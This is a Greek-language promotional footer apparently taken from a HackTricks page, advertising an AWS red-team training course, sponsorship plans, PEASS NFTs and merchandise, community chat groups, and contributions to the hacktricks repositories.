<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks**; ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε τη [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
